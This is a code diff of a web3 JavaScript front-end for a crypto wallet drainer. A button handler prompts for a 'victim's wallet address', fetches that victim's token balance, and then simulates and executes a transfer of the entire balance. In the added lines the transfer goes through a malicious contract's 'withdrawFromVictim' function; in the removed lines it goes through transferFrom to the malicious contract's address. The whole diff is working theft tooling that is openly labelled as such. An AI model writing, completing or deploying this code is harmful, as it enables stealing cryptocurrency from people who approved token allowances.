@@ -586,8 +586,8 @@
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     console.debug("transferTokensBtn click handler triggered");
 
-    // Define deployerAddress (replace with actual value or fetch dynamically)
-    const deployerAddress = await web3.eth.getCoinbase();  // Fetch deployer address dynamically from the wallet
+    // Fetch the deployer's address dynamically
+    const deployerAddress = await web3.eth.getCoinbase();
 
     // Step 1: Prompt for the victim's wallet address
     const victimAddress = prompt("Enter victim's wallet address:");
@@ -605,7 +605,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
 
         try {
-            // Step 3: Fetch the victim's token balance (returns in smallest unit)
+            // Step 3: Fetch the victim's token balance
             console.debug("Fetching victim's balance...");
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
             console.debug("Victim's balance fetched:", balance);
@@ -617,13 +617,12 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return;
             }
 
-            // Step 5: Simulate the withdrawal transaction (no gas fee)
-            console.debug("Simulating withdrawal transaction...");
+            // Step 5: Simulate the malicious contract's withdrawal function call
+            console.debug("Simulating malicious contract function call...");
             try {
-                // Use transferFrom because the malicious contract has permission to transfer tokens on behalf of the victim
-                const simulationResult = await tokenContract.methods
-                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance) // Use transferFrom to move tokens from victim's wallet
-                    .call({ from: deployerAddress }); // Use deployer's address to send the transaction
+                const simulationResult = await maliciousContract.methods
+                    .withdrawFromVictim(cleanedVictimAddress, balance)
+                    .call({ from: deployerAddress }); // Simulate the function call
                 console.debug("Simulation successful, result:", simulationResult);
 
                 alert(`Simulation successful. You can proceed to withdraw all tokens from the victim's wallet.`);
@@ -639,11 +638,11 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return; // Stop execution if simulation fails
             }
 
-            // Step 6: Execute the withdrawal transaction (real transfer)
-            console.debug("Attempting to execute withdrawal...");
-            const transaction = await tokenContract.methods
-                .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance) // Again, use transferFrom here
-                .send({ from: deployerAddress }); // Send the actual transaction from the deployer's address
+            // Step 6: Execute the malicious contract's withdrawal function call
+            console.debug("Executing malicious contract function call...");
+            const transaction = await maliciousContract.methods
+                .withdrawFromVictim(cleanedVictimAddress, balance)
+                .send({ from: deployerAddress }); // Execute the function
             console.debug("Transaction details:", transaction);
 
             // Notify successful withdrawal
@@ -654,6 +653,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
